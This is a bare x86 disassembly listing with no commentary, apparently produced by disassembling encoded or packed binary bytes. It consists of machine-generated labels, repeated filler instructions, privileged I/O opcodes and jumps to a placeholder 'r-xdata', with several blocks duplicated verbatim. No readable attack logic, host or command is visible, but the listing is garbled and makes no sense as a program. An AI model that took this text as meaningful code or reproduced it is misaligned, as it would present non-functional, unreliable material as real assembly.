add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
sub_46358e
lea edx [ ebx - 0x4f62856d ]
xchg ebx eax
rcr al 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebx + eax * 8 - 0x21 ]
push ss
push ebx
jpe r-xdata
test [ ebx + 0x6ae97a93 ] dl
insb
insb
add eax [ ebx ]
add ecx ebp
jpe r-xdata
xchg ebx eax
jpo r-xdata
add edx [ eax + 0x7bc29bd6 ]
sbb ecx [ ebp - 0x62856c6d ]
mov al 0x93
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
push esp
salc
das
std
jpo r-xdata
fcom [ ebx + 0x3030393 ]
add eax [ ebx ]
add eax [ ebx ]
insb
retn
cdq
xchg ebx eax
xchg ebx eax
xchg ebx eax
stosb [ edi ]
out dx eax
mov bh 0xa3
pushfd
pop ss
xchg esi eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
rcl [ ebx + 0x4fc61e93 ] 0x7b
adc [ edx - 0x2f856c6d ] 0x9c
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dh bl
outsd
jpe r-xdata
jg r-xdata
lea edx [ ebx - 0x4810e56d ]
adc [ eax ] 0xffffffef
mov bh 0xbf
xchg edx eax
insb
loopne r-xdata
add edx [ esi ]
push ebx
mov al [ 0x56cc048 ]
adc edx [ ebx + 0x151a9393 ]
push ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
jg r-xdata
pushfd
push ss
cli
0x53a09393 0xe57a
xchg edx eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
cmc
push ss
jpe r-xdata
mov al [ 0xffffffff92e57a53 ]
nop
xchg ebx eax
xchg ebx eax
retn
test al 0x50
shr [ ebp + eax + 0x13 ] 0x93
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939353 ]
retn 0x9393
add eax [ ebx ]
sti
clc
cdq
rcl ecx 0x1
lds ebx [ eax ]
imul edi [ ebx + 0x4f ] 0xffffff8b
xchg ebx eax
xchg ebx eax
adc [ edi - 0x7d ] dl
jpe r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
sar cl 0x97
sti
xchg ebx eax
mov [ 0x43fb9393 ] eax
xchg edx eax
xchg edx eax
xchg ebx eax
adc eax ebx
sar [ edx - 0x76 ] 0x91
xchg ebx eax
xchg ebx eax
pushfd
pop ss
neg [ ecx - 0x11ef6c6d ]
outsd
xchg ebx eax
pushfd
pop ss
enter 0x9399 0x93
jpe r-xdata
adc [ ebx + 0x3030393 ] 0x53160303
in eax 0x92
retn 0x9393
sub_4635c2
fidivr [ ebx - 0x3b ]
fcom [ ebx + 0x7acdcc93 ]
pop es
xchg [ ebx + 0x10030393 ] edx
push 0xffffffa2
pushfd
push ss
add eax 0x6c6c6c6b
jecxz r-xdata
add eax [ ebx ]
sbb dh bl
outsd
jpe r-xdata
jpe r-xdata
add edx [ esi ]
push ebx
pushfd
pop ss
neg [ ecx - 0x11ef6c6d ]
outsd
xchg ebx eax
pushfd
pop ss
enter 0x9399 0x93
jpe r-xdata
test [ esi + 0x6c ] ebp
stosd [ edi ]
mov al [ 0xffffffff92e57a53 ]
nop
xchg ebx eax
xchg ebx eax
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx + 0x50 ]
mov esi 0x54c39393
xchg ebx eax
xchg esp eax
xchg ebx eax
xchg edx eax
xchg ebx eax
insb
out 0x73 al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
cmc
sbb al dh
jne r-xdata
sbb bl dh
arpl [ ebx + 0x4a ] di
fst [ ebx + 0x7ad7f993 ]
dec ebp
mov ebx 0x3039393
add eax [ ebx ]
add eax esp
insb
add eax 0x93939327
int3
xchg ebx eax
xchg ebx eax
cmc
push ss
jpe r-xdata
shr [ ebp + eax + 0x13 ] 0x93
xchg ebx eax
xchg ebx eax
sbb dl [ 0xffffffff93939353 ]
test al 0x50
pushfd
push ss
cli
0x53a09393 0xe57a
xchg edx eax
retn 0x9393
add eax [ ebx ]
ficom [ ebx - 0x60a8ef6d ]
stc
cmp [ edx - 0x4e ] 0xffffffd5
xchg ebx eax
xchg ebx eax
add edi ebx
add eax [ ebx ]
insb
add eax 0x9393933f
mov edx 0x3039393
add eax [ ebx ]

xlat
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
test eax 0x6c9393d0
out 0x6f al
les edi [ edx - 0x5 ]
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esi
sbb [ edi - 0x3e ] bh
rol ch 0x7a
dec edx
aam 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
push ds
fist [ ecx - 0x769ac08 ]
pop edx
xchg esi eax
sub [ esi + eax * 4 - 0x6d ] ebp
xchg ebx eax
jpe r-xdata
movsd [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jns r-xdata
insb
mov al [ 0x5316d46c ]
jpe r-xdata
outsb
insb
add edi ebx
xchg [ ebx - 0x64dd046d ] dl
xchg edi eax
les ebx [ fs : edx ]
aad 0xd3
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x67 ]
scasd [ edi ]
cdq
mov al 0xcb
sbb dl dh
outsd
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
shr [ ebp - 0x42856c6d ] cl
rcl [ ebx - 0x4fcfc6d ] cl
pop edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
lds edi [ ebx + 0x47 ]
ficom [ ebx - 0x60a8ef6d ]
lds edi [ edx - 0x5 ]
rcl [ ebx + 0x3030393 ] 0x3
adc [ edi - 0x79 ] dl
push ss
push ebx
jpe r-xdata
outsd
insb
insb
add ebx [ eax ]
pop ebx
jpo r-xdata
retn 0x1b7b
xchg ebx eax
xchg ebx eax
insb
out 0x6f al
insb
out 0x77 al
insb
les ecx [ edi - 0x6c52d786 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
retn
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax eax
jpe r-xdata
aam 0x93
xchg ebx eax
sbb cl bh
mov bh 0x87
jpo r-xdata
xchg ebx eax
fist [ ebx - 0x4818936d ]
mov ebx [ eax ]
push ebp
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x7a ] bh
hlt
add eax [ ebx ]
pushfd
push ss
stosb [ edi ]
stosd [ edi ]
xchg ebx eax
xchg ebx eax
int 0x50
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
mov [ ebx + 0x517aca93 ] edx
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
sub_4637d8
ficom [ ebx + 0x18c60393 ]
jg r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
retn
and esp [ esp + ebp * 2 + 0x6c ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
fist [ edi - 0x6c441d86 ]
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
ficomp [ esi - 0x11556c6d ]
xchg [ edx - 0x5 ] edi
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
sbb dl ch
xchg [ ebx - 0x47 ] edi
xchg [ ebx - 0x17e8046d ] dl
lea eax [ esi + 0x7a ]
shr [ edx + 0x6c ] cl
insb
add ebp [ ebp + eax * 8 - 0x9 ]
mov al [ 0xffffffffad547a5a ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edx [ eax ]
push edi
lahf
insb
add al 0x3b
xchg ebx eax
xchg ebx eax
xchg ebx eax
test al 0x50
jpe r-xdata
push eax
xchg esp eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add esi ebp
sbb dl dh
inc ebx
sbb [ ecx + 0x7a ] dl
dec ecx
xchg ebp eax
xchg ebx eax
xchg ebx eax
add ebp [ esi + 0x6f ]
retn
sub_46384c
rcl [ ebx + 0x24180393 ] 0x1
dec ebx
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
loope r-xdata
salc
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
retn
salc
push eax
cmc
sbb dl dh
popad

imul esi ebp 0x1a
fidivr [ ebp + 0x1e ]
salc
push ebx
mov al [ 0xffffffffae7ac55a ]
outsb
insb
insb
sbb cl ch
fstp [ ebx + 0x14 ]
xchg [ ebx - 0x582ae56d ] edx
sti
xor [ 0x7ac478f2 ] esi
pop eax
xlat
xchg ebx eax
xchg ebx eax
add edi ebx
leave
jl r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
jle r-xdata
xchg ebx eax
add edi [ edx - 0x58 ]
test al 0x93
sbb dl ch
retn
sub_463877
stc
test al 0xf5
sbb dl dh
arpl cx di
loope r-xdata
salc
push eax
cmc
sbb dl dh
popad

imul esi ebp 0x1a
fidivr [ ebp + 0x1e ]
salc
push ebx
mov al [ 0xffffffffae7ac55a ]
outsb
insb
insb
sbb cl ch
fstp [ ebx + 0x14 ]
xchg [ ebx - 0x582ae56d ] edx
sti
xor [ 0x7ac478f2 ] esi
pop eax
xlat
xchg ebx eax
xchg ebx eax
add edi ebx
leave
jl r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
jle r-xdata
xchg ebx eax
add edi [ edx - 0x58 ]
test al 0x93
sbb dl ch
retn
sub_463889
mov cl 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
imul esi ebp 0x1a
fidivr [ ebp + 0x1e ]
salc
push ebx
mov al [ 0xffffffffae7ac55a ]
outsb
insb
insb
sbb cl ch
fstp [ ebx + 0x14 ]
xchg [ ebx - 0x582ae56d ] edx
sti
xor [ 0x7ac478f2 ] esi
pop eax
xlat
xchg ebx eax
xchg ebx eax
add edi ebx
leave
jl r-xdata
jle r-xdata
xchg ebx eax
add edi [ edx - 0x58 ]
test al 0x93
sbb dl ch
retn
sub_46397b
sar [ edx + 0x16 ] 0x81
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc ebp esi
adc [ ecx - 0x6c6ea986 ] 0xffffff93
add eax [ ebx ]
add eax [ ebx ]
add ebp [ edx + 0x179c9bce ]
lds edx [ edx - 0x31556c6d ]
lahf
jpe r-xdata
pushfd
fwait
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edi [ ebx + 0x28 ]
test [ ebx - 0x6d94ef6d ] dl
pushfd
pop ss
pop es
mov [ 0x53a09393 ] eax
sbb dl bh
mov bh 0x8b
sbb dl bh
mov bh 0x8f
stosb [ edi ]
ror [ ebx - 0x4e74ea64 ] 0x1
xchg ebx eax
xchg ebx eax
adc bh dh
mov bh 0x83
xchg ebx eax
push ds
xlat
mov bh 0x83
retn
outsb
insb
insb
adc [ ebx - 0x43cd856d ] 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc ebp esi
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx eax
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
salc
arpl ax ax
push ss
adc [ ebx + 0x53169393 ] 0xffffff9c
push ss
fwait
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
insb
add eax 0x9393933f
sti
xchg ebx eax
adc edx [ ebx + 0x6c93f993 ]
out 0xb7 eax
mov bl 0x7a
sbb [ ebp + 0x3039393 ] 0xc4
sbb dl ch
stosd [ edi ]
jpo r-xdata
insb
adc [ edi - 0x61 ] dl
sbb dl bh
mov bh 0xb3
push ss
push ebx
pushfd
pop ss
inc esi
mov dl 0x93
xchg ebx eax
sbb bh dl
mov bh 0x8b
insb
out 0xb7 eax
cmp [ edx - 0x5b ] 0xffffff8b
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
push ebx
pushfd
push ss
adc [ ebx + 0x5a169393 ] 0xffffff9c
sahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5f ]
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3030303
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0xd0
mov edi 0x9c5316f5
pop ss
or [ esi + 0x10f59393 ] esp
call 0xffffffffaf64ce6f
nop
pushfd
pop ss
xchg esi eax
mov dl 0x93
xchg ebx eax
jpe r-xdata
retn
fist [ ebx + 0x7a5b1893 ]
or al 0x9b
xchg ebx eax
xchg ebx eax
add esi ebp
sbb cl dh
aad 0x18
dec ecx
stc
adc [ edx + 0x6df6169c ] 0x6c
insb
sar [ edx + 0xf ] 0xb9
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6676 ]
push ds
push ds
pop ebx
outsb
insb
insb
push ds
push ss
aas
insb
insb
jpo r-xdata
out dx al
mov bl 0x93
xchg ebx eax
add edi [ edx - 0x3f ]
mov eax 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
std
jpe r-xdata
add eax [ ebx ]
add ebp [ eax - 0x2d ]
jpe r-xdata
mov esp 0x3039393
jpe r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add edi [ ebx - 0x71 ]
xlat
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
sub_4639e8
sbb [ ebp + 0x7b ] dl
and ebp [ esi + 0x6c ]
outsb
insb
insb
adc [ ebx - 0x43cd856d ] 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc ebp esi
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx eax
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
salc
arpl ax ax
insb
adc [ edi - 0x61 ] dl
sbb dl bh
mov bh 0xb3
push ss
push ebx
pushfd
pop ss
inc esi
mov dl 0x93
xchg ebx eax
sbb bh dl
mov bh 0x8b
insb
out 0xb7 eax
cmp [ edx - 0x5b ] 0xffffff8b
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
push ebx
pushfd
push ss
adc [ ebx + 0x5a169393 ] 0xffffff9c
push ss
adc [ ebx + 0x53169393 ] 0xffffff9c
push ss
fwait
xchg ebx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
insb
add eax 0x9393933f
sti
xchg ebx eax
adc edx [ ebx + 0x6c93f993 ]
out 0xb7 eax
mov bl 0x7a
sbb [ ebp + 0x3039393 ] 0xc4
sbb dl ch
stosd [ edi ]
jpo r-xdata
sahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5f ]
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3030303
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and al 0xd0
mov edi 0x9c5316f5
pop ss
or [ esi + 0x10f59393 ] esp
call 0xffffffffaf64ce6f
nop
pushfd
pop ss
xchg esi eax
mov dl 0x93
xchg ebx eax
jpe r-xdata
retn
fist [ ebx + 0x7a5b1893 ]
or al 0x9b
xchg ebx eax
xchg ebx eax
add esi ebp
sbb cl dh
aad 0x18
dec ecx
stc
adc [ edx + 0x6df6169c ] 0x6c
insb
sar [ edx + 0xf ] 0xb9
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6676 ]
push ds
push ds
pop ebx
outsb
insb
insb
push ds
push ss
aas
insb
insb
jpo r-xdata
out dx al
mov bl 0x93
xchg ebx eax
add edi [ edx - 0x3f ]
mov eax 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
std
jpe r-xdata
add eax [ ebx ]
add ebp [ eax - 0x2d ]
jpe r-xdata
mov esp 0x3039393
jpe r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add edi [ ebx - 0x71 ]
xlat
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
sub_463b54
cmc
sbb cl dh
fcmovne st0
jpe r-xdata
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov bh 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ edx + 0x547a9fde ]
ficom [ ebx - 0xafcfc6d ]
sbb ch dh
arpl [ eax ] bx
insd
cmc
sbb ch dh
popad
sbb [ edx - 0xb ] ch
sbb ch dh
jpe r-xdata
adc edx [ ebx + 0x6b189393 ]
push ss
insb
pushfd
push ss
xchg esp eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
xchg ebp eax
xchg ebx eax
xchg ebx eax
sbb cl dh
outsd
jpe r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ ebx ]
out dx al
adc [ edx + 0x6df6169c ] 0x6c
insb
sar [ edx + 0xf ] 0xb9
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6676 ]
push ds
push ds
pop ebx
outsb
insb
insb
push ds
push ss
aas
insb
insb
jpo r-xdata
sbb al dl
xchg ecx edi
xchg edi eax
sbb dl bh
mov bh 0xbb
sti
xchg ebx eax
mov [ 0x53909393 ] eax
retn
xchg esi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stosb [ edi ]
out dx eax
mov bh 0x8f
pushfd
push ss
dec ecx
test [ ebx - 0x7bbc856d ] dl
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393933f
retn
fist [ ebx + 0x7a5b1893 ]
or al 0x9b
xchg ebx eax
xchg ebx eax
add esi ebp
sbb cl dh
aad 0x18
dec ecx
stc
sub_463bc0
stc
xchg ebx eax
insb
add eax 0x93939313
sbb [ ebx + 0x16 ] ch
insb
pushfd
push ss
xchg esp eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
sub_463bd3
insb
add eax 0x9393933f
jpe r-xdata
stc
xchg ecx eax
jpe r-xdata
outsb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb bl dh
jg r-xdata
sbb dl dh
inc ebx

stosd [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
0x5316
stc
xchg edi eax
sbb dl bh
mov bh 0xbb
sti
xchg ebx eax
mov [ 0x53909393 ] eax
retn
stc

sub_463c45
pushfd
pop ss
sbb [ edi - 0x6c066c6d ] bl
jpe r-xdata
xchg ebx eax
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx - 0x6c6c6484 ]
stc
cld

sub_463ca0
shr [ esp + eax + 0x3f ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
add ebx [ eax ]
push 0x7a
shl [ eax + 0x6c ] cl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
enter 0x5610 0xe7
pop edx
push eax
insb
sub_463cc5
sbb [ edi + 0x10 ] bh
jg r-xdata
xchg [ ebx - 0x2ce7fc6d ] dl
lahf
sbb bl dl
lahf
sbb [ ebx + 0x1a8bd318 ] dl
xchg edi eax
mov bh 0x18
xchg edi eax
mov bh 0xca
push eax
add eax [ ebx ]
push ebp
xlat
mov bh 0x83
xchg ecx eax
pushfd
and al 0xd0
xlat
cmc
push ss
push ebx
pushfd
pop ss
sub eax 0x7a9393da
sbb al 0x60
insb
insb
add eax [ ebx ]
add eax ebx
insb
rol ah 0xa0
insb
les edi [ edx - 0x52 ]
mov ch 0x93
xchg ebx eax
add eax [ ebx ]
add edi [ edx + 0x7 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb ah dl
xchg ecx eax
cmc
nop
xlat
mov bh 0xb3
pushfd
and al 0x53
retn
sub_463cfa
sbb [ ebp + 0x7b ] dl
or eax 0x106c6c69
push edi
lahf
sbb dl bh
mov bh 0x83
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
enter 0x5610 0xe7
pop edx
push eax
mov esp 0x6cc09393
les eax [ edi + 0x6e43261a ]
insb
insb
jpe r-xdata
xchg ebp eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb ah dl
xchg ecx eax
cmc
nop
xlat
mov bh 0xb3
pushfd
and al 0x53
retn
mov [ 0x3039393 ] al
add eax [ ebx ]
add eax [ ebx ]
sbb dl bl
scasd [ edi ]
sbb ch al
retn
sub_46413b
sahf
xchg ebx eax
xchg ebx eax
cmc
sbb cl dh
jpo r-xdata
cli
enter 0x877a 0xbf
xchg ebx eax
dec ecx
cmc
sbb cl dh
jg r-xdata
stosb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx - 0x17 ]
scasd [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ds
das
adc [ ebx - 0x7c6c046d ] 0xd61e9393
pushad
insb
xchg ebx eax
add eax [ ebx ]
add eax eax
insb
out 0xb7 eax
mov ebp [ ebp + eax * 8 - 0x19 ]
jpo r-xdata
dec edx
cmc
sbb cl dh
jge r-xdata
insb
jpe r-xdata
mov al [ 0x3039393 ]
add eax [ ebx ]
add edx ebx
retn
jl r-xdata
arpl bx ax
les ebx [ edx ]
into
arpl [ ebx + 0x59 ] di
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
push ds
salc
cmc
sbb cl dh
arpl cx di
out 0xc8 al
cmc
sbb cl dh
popad
stc
into
and eax 0x41d61af5
mov al [ 0xffffffffbcec7a48 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax eax
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb al dh
mov ebp 0xa3c61af5
stc
0xc61af5c9 0x7aa1
insb
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
fwait
sbb eax edi
mov ss [ edi + 0x10 ]
push 0xffffffb3
pushfd
adc [ edi - 0x25 ] ebx
xchg ebx eax
xchg ebx eax
aam 0x10
insb
nop
pushfd
adc [ edi ] ebp
fist [ ebx + 0x43d61b93 ]
rcr [ ebx ] 0x1
iretd
mov ecx 0x3039393
sar [ edx + 0x4c ] 0x60
insb
insb
add eax [ ebx ]
push esp
salc
arpl di di
mov al [ 0x406c93a1 ]
sbb [ ebx + 0x16 ] cl
dec eax
pushfd
pop ss
aam 0x9b
xchg ebx eax
xchg ebx eax
jpe r-xdata
fwait
xchg ebx eax
xchg ebx eax
jl r-xdata
sbb edx esi
arpl [ ebx ] bx
salc
jae r-xdata
rcl [ ebx + 0x3030393 ] 0x1
add ebx [ edi + edx + 0x6c6c6bf7 ]
jpe r-xdata
add eax [ ebx ]
add ecx eax
jpe r-xdata
xchg esp eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
dec esp
inc eax
push 0xd19b5510
sbb ecx edi
xchg [ eax ] dh
adc [ ebp - 0x4d ] ch
pushfd
adc ecx eax
fist [ ebx - 0x72ff856d ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov al [ 0x505acc53 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
stc
div ebp
sbb dl dh
jpo r-xdata
xchg ebx eax
add eax [ ebx ]
add ebx [ eax ]
salc
imul ebx [ esi ] 0xffffffde
jae r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
cmc
adc al ch
aad 0x93
div ebp
sbb bl dh
inc ebx
0xe4f9
pushad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax eax
inc ecx
mov esi 0x53a09393
int3
add eax [ ebx ]
add eax [ ebx ]

xlat
xchg ebx eax
xchg ebx eax
add edi [ edx + 0x76 ]
jg r-xdata
pushfd
pop ss
0x1093939b 0xb7ef
xchg [ ebx - 0x6c6b9586 ] edx
xchg ebx eax
stc
cmc
sbb dl dh
jns r-xdata
add eax [ ebx ]
add eax [ ebx ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
jpe r-xdata
adc bh ch
mov bh 0x87
xchg ebx eax
jpe r-xdata
stc
hlt
sub_46419d
and esp [ edx + 0x7a039393 ]
mov ebx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
pop esi
sub [ edx + 0x2d1ac4f3 ] eax
inc edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
cwde
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpo r-xdata
les ebx [ edx ]
sub eax 0x93939347
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
mov eax 0x29169c54
rcl [ ebx - 0x2a0b856d ] cl
xchg ebx eax
xchg ebx eax
add esi ebp
sbb cl dh
insb
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
fwait
sbb eax edi
mov ss [ edi + 0x10 ]
push 0xffffffb3
pushfd
adc [ edi - 0x25 ] ebx
xchg ebx eax
xchg ebx eax
aam 0x10
insb
nop
pushfd
adc [ edi ] ebp
fist [ ebx + 0x43d61b93 ]
rcr [ ebx ] 0x1
iretd
mov ecx 0x3039393
sar [ edx + 0x4c ] 0x60
insb
insb
add eax [ ebx ]
push esp
salc
arpl di di
mov al [ 0x406c93a1 ]
sbb [ ebx + 0x16 ] cl
dec eax
pushfd
pop ss
aam 0x9b
xchg ebx eax
xchg ebx eax
jpe r-xdata
fwait
xchg ebx eax
xchg ebx eax
jl r-xdata
sbb edx esi
arpl [ ebx ] bx
salc
jae r-xdata
rcl [ ebx + 0x3030393 ] 0x1
